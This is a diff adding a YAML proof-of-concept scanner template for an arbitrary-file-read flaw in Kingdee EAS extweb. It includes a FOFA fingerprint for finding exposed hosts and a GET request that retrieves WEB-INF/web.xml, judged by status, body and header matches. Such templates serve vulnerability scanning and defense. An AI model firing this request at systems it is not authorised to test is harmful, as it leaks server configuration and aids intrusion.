@@ -1,0 +1,22 @@
+id: poc-yaml-kingdee-eas-extweb-anyfile-read
+info:
+  name: 金蝶EAS extweb 任意文件读取
+  severity: info
+  tags:
+  - 文件读取
+  finger: 金蝶EAS
+  fofa: eassso/common/js/
+requests:
+- method: GET
+  path: /easWebClient/deploy/client/ctrlhome/webapps/extweb/WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"web-app") &&
+
+    contains(body,"<servlet-class>") &&
+
+    contains(headers,"text/xml")
+
+    '
+variables: {}
+transport: http
